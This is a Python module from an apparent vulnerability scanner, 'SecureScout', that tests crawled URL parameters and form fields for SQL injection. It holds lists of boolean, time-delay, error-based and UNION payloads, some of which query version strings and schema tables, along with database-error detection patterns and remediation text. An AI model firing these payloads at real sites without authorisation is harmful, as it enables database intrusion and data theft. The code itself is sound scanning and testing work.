#!/usr/bin/env python3
# SecureScout - SQL Injection Test Module

import logging
import re
import time
import random
from typing import Dict, List, Any, Tuple, Set
from urllib.parse import parse_qs, urlparse, urlencode, urlunparse
from .base_module import BaseTestModule

logger = logging.getLogger("securescout.sqlinjection")

class SQLInjection(BaseTestModule):
    """
    SQL Injection testing module.
    Tests for various SQL injection vulnerabilities in input parameters.
    """
    
    def __init__(self, scanner):
        """Initialize the SQL Injection test module."""
        super().__init__(scanner)
        self.name = "SQLInjection"
        self.description = "Tests for SQL injection vulnerabilities in input parameters"
        self.category = "injection"
        
        # Payloads for detecting SQL injection vulnerabilities
        self.test_payloads = {
            # Boolean-based blind payloads
            "boolean": [
                "' OR '1'='1",
                "' OR 1=1 --",
                "' OR 1=1#",
                "' OR 1=1/*",
                '" OR "1"="1',
                '" OR 1=1 --',
                '" OR 1=1#',
                '" OR 1=1/*',
                "') OR ('1'='1",
                "')) OR (('1'='1",
                "' OR '1'='1' --",
                ") OR 1=1 --",
                "' OR 'a'='a",
                "') OR ('a'='a",
                "1' OR '1'='1'",
                "1 OR 1=1",
                "1' OR '1'='1' --"
            ],
            
            # Time-based blind payloads
            "time": [
                "' OR SLEEP(3) --",
                "' OR SLEEP(3)#",
                "' OR SLEEP(3)/*",
                "\" OR SLEEP(3) --",
                "\" OR SLEEP(3)#",
                "\" OR SLEEP(3)/*",
                "') OR SLEEP(3) --",
                "')) OR SLEEP(3) --",
                "1') OR SLEEP(3) --",
                "' WAITFOR DELAY '0:0:3' --",
                "\" WAITFOR DELAY '0:0:3' --",
                "') WAITFOR DELAY '0:0:3' --",
                "' OR pg_sleep(3) --",
                "\" OR pg_sleep(3) --",
                "') OR pg_sleep(3) --",
                "')) OR pg_sleep(3) --",
                "' SELECT BENCHMARK(30000000,MD5(CHAR(97))) --",
                "\" SELECT BENCHMARK(30000000,MD5(CHAR(97))) --"
            ],
            
            # Error-based payloads
            "error": [
                "'",
                "\"",
                "')",
                "\")",
                "';",
                "\";",
                "');",
                "\");",
                "'; WAITFOR DELAY '0:0:0' --",
                "1/0",
                "' OR 1/0 --",
                "\" OR 1/0 --",
                "' AND 1=CONVERT(int,(SELECT CHAR(58))) --",
                "' AND 1=CAST((SELECT 1) AS int) --",
                "' AND CAST((SELECT db_name()) AS int)=1 --",
                "' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)=1 --",
                "' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --"
            ],
            
            # UNION-based payloads
            "union": [
                "' UNION SELECT NULL --",
                "' UNION SELECT NULL,NULL --",
                "' UNION SELECT NULL,NULL,NULL --",
                "' UNION SELECT NULL,NULL,NULL,NULL --",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
                "' UNION SELECT 1,2,3,4,5 --",
                "' UNION ALL SELECT 1,2,3,4,5 --",
                "' UNION SELECT @@version --",
                "' UNION SELECT 'a',@@version,'c' --",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM information_schema.tables --"
            ],
            
            # Basic SQLi detection
            "generic": [
                "%27",
                "'"
            ]
        }
        
        # Error patterns to detect successful SQLi
        self.error_patterns = [
            re.compile(r"SQL syntax.*?MySQL", re.IGNORECASE | re.DOTALL),
            re.compile(r"Warning.*?mysqli?", re.IGNORECASE | re.DOTALL),
            re.compile(r"Warning.*?\Woci_", re.IGNORECASE | re.DOTALL),
            re.compile(r"Oracle.*?Driver", re.IGNORECASE | re.DOTALL),
            re.compile(r"Microsoft Access Driver", re.IGNORECASE | re.DOTALL),
            re.compile(r"JET Database Engine", re.IGNORECASE | re.DOTALL),
            re.compile(r"SQLite/JDBCDriver", re.IGNORECASE | re.DOTALL),
            re.compile(r"SQLite.Exception", re.IGNORECASE | re.DOTALL),
            re.compile(r"System.Data.SQLite.SQLiteException", re.IGNORECASE | re.DOTALL),
            re.compile(r"ODBC Driver.*? SQL Server", re.IGNORECASE | re.DOTALL),
            re.compile(r"Microsoft SQL Native Client", re.IGNORECASE | re.DOTALL),
            re.compile(r"SQLSTATE", re.IGNORECASE | re.DOTALL),
            re.compile(r"Microsoft OLE DB Provider for", re.IGNORECASE | re.DOTALL),
            re.compile(r"\bSQL Server\b", re.IGNORECASE | re.DOTALL),
            re.compile(r"Unclosed quotation mark after", re.IGNORECASE | re.DOTALL),
            re.compile(r"Incorrect syntax near", re.IGNORECASE | re.DOTALL),
            re.compile(r"Syntax error in string in query expression", re.IGNORECASE | re.DOTALL),
            re.compile(r"Unclosed quotation mark before the character string", re.IGNORECASE | re.DOTALL),
            re.compile(r"Error converting data type", re.IGNORECASE | re.DOTALL),
            re.compile(r"PostgreSQL.*?ERROR", re.IGNORECASE | re.DOTALL),
            re.compile(r"DB2 SQL error", re.IGNORECASE | re.DOTALL),
            re.compile(r"Sybase message", re.IGNORECASE | re.DOTALL),
            re.compile(r"Syntax error.*?PLS/SQL", re.IGNORECASE | re.DOTALL),
            re.compile(r"ORA-[0-9][0-9][0-9][0-9]", re.IGNORECASE | re.DOTALL),
            re.compile(r"quoted string not properly terminated", re.IGNORECASE | re.DOTALL),
            re.compile(r"SQLCODE", re.IGNORECASE | re.DOTALL),
            re.compile(r"SQL command not properly ended", re.IGNORECASE | re.DOTALL),
            re.compile(r"unexpected end of SQL command", re.IGNORECASE | re.DOTALL),
            re.compile(r"You have an error in your SQL syntax", re.IGNORECASE | re.DOTALL)
        ]
    
    def run(self) -> List[Dict[str, Any]]:
        """
        Run SQL injection tests against the target.
        
        Returns:
            List of findings dictionaries
        """
        logger.info("Starting SQL injection tests")
        
        self.findings = []
        tested_urls = set()
        
        # Get form inputs discovered during crawling
        forms = self.get_forms_from_crawler()
        
        # Get GET parameters from URLs
        urls_with_params = self.get_urls_with_parameters()
        
        # Test GET parameters
        for url in urls_with_params:
            if url not in tested_urls:
                self.test_get_parameters(url)
                tested_urls.add(url)
        
        # Test forms
        for form in forms:
            self.test_form(form)
        
        logger.info(f"SQL injection tests completed with {len(self.findings)} findings")
        return self.findings
    
    def get_forms_from_crawler(self) -> List[Dict[str, Any]]:
        """Get forms from crawler results."""
        if hasattr(self.scanner, 'crawler') and hasattr(self.scanner.crawler, 'results'):
            return self.scanner.crawler.results.get('forms', [])
        return []
    
    def get_urls_with_parameters(self) -> List[str]:
        """Extract URLs with query parameters from crawler results."""
        urls = []
        if hasattr(self.scanner, 'crawled_urls'):
            for url in self.scanner.crawled_urls:
                parsed = urlparse(url)
                if parsed.query:
                    urls.append(url)
        return urls
    
    def test_get_parameters(self, url: str) -> None:
        """
        Test GET parameters in a URL for SQL injection vulnerabilities.
        
        Args:
            url: URL with query parameters to test
        """
        logger.debug(f"Testing GET parameters in {url}")
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Skip if no parameters
        if not query_params:
            return
            
        # Test each parameter
        for param, values in query_params.items():
            original_value = values[0] if values else ""
            
            # Test for error-based SQLi
            for payload in self.test_payloads["error"]:
                modified_params = query_params.copy()
                modified_params[param] = [payload]
                new_query = urlencode(modified_params, doseq=True)
                
                # Rebuild the URL with the modified query
                test_url_parts = list(parsed_url)
                test_url_parts[4] = new_query  # index 4 is the query part
                test_url = urlunparse(test_url_parts)
                
                # Send the request
                response, error = self.scanner._make_request(test_url, method='GET')
                
                if error:
                    continue
                
                # Check for SQL errors in the response
                if self.check_for_sql_errors(response):
                    self.report_sql_injection_finding(url, param, payload, "error-based", response)
                    # Skip further tests for this parameter once a vulnerability is found
                    break
            
            # Test for boolean-based SQLi
            # First, get a baseline response
            baseline_response, error = self.scanner._make_request(url, method='GET')
            if error or not baseline_response:
                continue
                
            baseline_content = baseline_response.text
            baseline_status = baseline_response.status_code
            
            # Test each boolean payload
            for payload in self.test_payloads["boolean"]:
                modified_params = query_params.copy()
                modified_params[param] = [payload]
                new_query = urlencode(modified_params, doseq=True)
                
                test_url_parts = list(parsed_url)
                test_url_parts[4] = new_query
                test_url = urlunparse(test_url_parts)
                
                response, error = self.scanner._make_request(test_url, method='GET')
                
                if error or not response:
                    continue
                
                # Naive check: If injection causes a significant change in response 
                # and returns a 200 OK (meaning the query was successful)
                if (response.status_code == 200 and 
                    baseline_status != 200 or
                    abs(len(response.text) - len(baseline_content)) > len(baseline_content) * 0.3):
                    self.report_sql_injection_finding(url, param, payload, "boolean-based", response)
                    break
            
            # Test for time-based SQLi
            for payload in self.test_payloads["time"]:
                modified_params = query_params.copy()
                modified_params[param] = [payload]
                new_query = urlencode(modified_params, doseq=True)
                
                test_url_parts = list(parsed_url)
                test_url_parts[4] = new_query
                test_url = urlunparse(test_url_parts)
                
                # Measure response time
                start_time = time.time()
                response, error = self.scanner._make_request(test_url, method='GET')
                response_time = time.time() - start_time
                
                if error:
                    continue
                    
                # If response time is significantly higher, might indicate time-based SQLi
                # Use a threshold slightly longer than the sleep time in the payload
                if response_time > 2.5:  # Using 2.5s threshold for 3s sleep payloads
                    self.report_sql_injection_finding(url, param, payload, "time-based", response, response_time)
                    break
    
    def test_form(self, form: Dict[str, Any]) -> None:
        """
        Test a form for SQL injection vulnerabilities.
        
        Args:
            form: Dictionary containing form details
        """
        form_url = form.get('action', '')
        form_method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        # Skip if no action URL or no inputs
        if not form_url or not inputs:
            return
            
        logger.debug(f"Testing form at {form_url} with method {form_method}")
        
        # Prepare form data with default values
        form_data = {}
        
        for input_field in inputs:
            input_type = input_field.get('type', '')
            input_name = input_field.get('name', '')
            
            # Skip if no name
            if not input_name:
                continue
                
            # Skip file inputs, checkboxes, and radio buttons
            if input_type in ['file', 'checkbox', 'radio', 'submit', 'button', 'image', 'reset']:
                continue
                
            # Use provided value or a default
            if input_type == 'password':
                form_data[input_name] = 'testpassword123'
            elif input_type == 'email':
                form_data[input_name] = 'test@example.com'
            elif input_type == 'number':
                form_data[input_name] = '1'
            else:
                form_data[input_name] = 'testvalue'
        
        # Skip if no valid inputs to test
        if not form_data:
            return
            
        # Get baseline response
        baseline_response = None
        if form_method == 'POST':
            baseline_response, error = self.scanner._make_request(form_url, method='POST', data=form_data)
        else:
            # Convert form data to query string for GET
            params = urlencode(form_data)
            url = f"{form_url}?{params}" if '?' not in form_url else f"{form_url}&{params}"
            baseline_response, error = self.scanner._make_request(url, method='GET')
        
        if error or not baseline_response:
            return
            
        baseline_content = baseline_response.text
        baseline_status = baseline_response.status_code
        
        # Test each input field
        for input_name in form_data.keys():
            # Test each payload category
            for category, payloads in self.test_payloads.items():
                for payload in payloads:
                    # Skip time-based tests if stealth is high
                    if category == "time" and self.scanner.stealth_level == "high":
                        continue
                        
                    # Prepare modified form data
                    test_data = form_data.copy()
                    test_data[input_name] = payload
                    
                    # Send request based on form method
                    if form_method == 'POST':
                        response, error = self.scanner._make_request(form_url, method='POST', data=test_data)
                    else:
                        params = urlencode(test_data)
                        url = f"{form_url}?{params}" if '?' not in form_url else f"{form_url}&{params}"
                        response, error = self.scanner._make_request(url, method='GET')
                    
                    if error or not response:
                        continue
                    
                    # Check for error-based SQLi
                    if self.check_for_sql_errors(response):
                        self.report_sql_injection_finding(form_url, input_name, payload, f"error-based ({form_method})", response)
                        break
                    
                    # Check for time-based SQLi
                    if category == "time":
                        # Measure response time
                        start_time = time.time()
                        if form_method == 'POST':
                            response, error = self.scanner._make_request(form_url, method='POST', data=test_data)
                        else:
                            params = urlencode(test_data)
                            url = f"{form_url}?{params}" if '?' not in form_url else f"{form_url}&{params}"
                            response, error = self.scanner._make_request(url, method='GET')
                        
                        response_time = time.time() - start_time
                        
                        if error:
                            continue
                            
                        # If response time is significantly higher, might indicate time-based SQLi
                        if response_time > 2.5:  # Using 2.5s threshold for 3s sleep payloads
                            self.report_sql_injection_finding(form_url, input_name, payload, f"time-based ({form_method})", response, response_time)
                            break
                    
                    # Check for boolean-based SQLi
                    if category == "boolean":
                        # Naive check: If injection causes a significant change in response
                        if (response.status_code == 200 and 
                            baseline_status != 200 or
                            abs(len(response.text) - len(baseline_content)) > len(baseline_content) * 0.3):
                            self.report_sql_injection_finding(form_url, input_name, payload, f"boolean-based ({form_method})", response)
                            break
    
    def check_for_sql_errors(self, response) -> bool:
        """
        Check if the response contains SQL error messages.
        
        Args:
            response: HTTP response object
            
        Returns:
            bool: True if SQL errors found, False otherwise
        """
        if not response or not hasattr(response, 'text') or not response.text:
            return False
            
        content = response.text
        
        for pattern in self.error_patterns:
            if pattern.search(content):
                return True
                
        return False
    
    def report_sql_injection_finding(self, url: str, param: str, payload: str, 
                                    injection_type: str, response, response_time: float = None) -> None:
        """
        Report a SQL injection finding.
        
        Args:
            url: URL where the vulnerability was found
            param: Parameter name that is vulnerable
            payload: SQL injection payload that worked
            injection_type: Type of SQL injection (error-based, time-based, etc.)
            response: HTTP response object
            response_time: Response time (for time-based SQLi)
        """
        title = f"SQL Injection in {param}"
        
        description = f"""A SQL injection vulnerability was detected in the '{param}' parameter.
        This vulnerability allows an attacker to inject malicious SQL code into database queries,
        potentially leading to unauthorized access, data leakage, or data manipulation.
        
        The vulnerability was identified using {injection_type} SQL injection techniques.
        
        Payload: {payload}
        """
        
        if response_time:
            description += f"\nResponse time: {response_time:.2f} seconds"
        
        evidence = f"URL: {url}\nParameter: {param}\nPayload: {payload}\nResponse Status: {response.status_code}"
        
        if response.text and len(response.text) < 1000:
            evidence += f"\nResponse excerpt: {response.text[:1000]}"
        
        remediation = """
        To fix SQL injection vulnerabilities:
        
        1. Use prepared statements (parameterized queries) instead of string concatenation
        2. Use stored procedures when possible
        3. Apply input validation and sanitization
        4. Use an ORM (Object-Relational Mapping) framework
        5. Apply the principle of least privilege to database accounts
        6. Implement proper error handling to avoid leaking database information
        """
        
        references = [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "https://portswigger.net/web-security/sql-injection"
        ]
        
        self.add_finding(
            title=title,
            description=description,
            severity="high",
            location=url,
            evidence=evidence,
            remediation=remediation,
            references=references,
            cwe_id="CWE-89",
            cvss_score=8.5
        )